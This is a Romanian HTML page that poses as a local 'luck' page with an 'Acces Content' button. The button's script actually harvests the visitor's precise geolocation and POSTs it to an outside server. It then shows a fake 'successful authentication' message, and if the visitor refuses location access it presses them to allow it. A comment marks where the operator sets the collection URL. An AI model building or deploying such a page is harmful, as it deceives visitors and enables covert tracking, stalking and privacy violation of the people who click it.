<!DOCTYPE html>
<html lang="ro">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Barfa Falticeni</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f4f4f4;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        h2 {
            color: #333;
        }
        button {
            background-color: #28a745;
            color: white;
            border: none;
            padding: 15px 20px;
            font-size: 16px;
            cursor: pointer;
            border-radius: 5px;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #218838;
        }
    </style>
</head>
<body>
    <h2>Pagina de Bafta a Falticeniului</h2>
    <button onclick="sendLocation()">Acces Content</button>
    
    <script>
        function sendLocation() {
            if (!navigator.geolocation) {
                alert('Din păcate, browserul tău nu suportă geolocalizare.');
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const latitude = position.coords.latitude;
                    const longitude = position.coords.longitude;
                    const accuracy = position.coords.accuracy;

                    console.log(`Lat: ${latitude}, Lon: ${longitude}, Precizie: ${accuracy}m`);

                    fetch('https://barfafalticeni-server.com/send-location', { // Modifică URL-ul serverului aici
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ latitude, longitude, accuracy })
                    })
                    .then(response => response.json())
                    .then(data => alert(`Autentificare realizată cu succes!`))
                    .catch(error => console.error('Eroare:', error));
                },
                (error) => {
                    if (error.code === error.PERMISSION_DENIED) {
                        alert('Te rog să permiți accesul la locație pentru a continua.');
                    } else {
                        alert('Nu s-a putut obține locația. Încearcă din nou.');
                    }
                },
                {
                    enableHighAccuracy: true,
                    timeout: 15000, // Timeout mai mare pentru iOS
                    maximumAge: 0
                }
            );
        }
    </script>
</body>
</html>
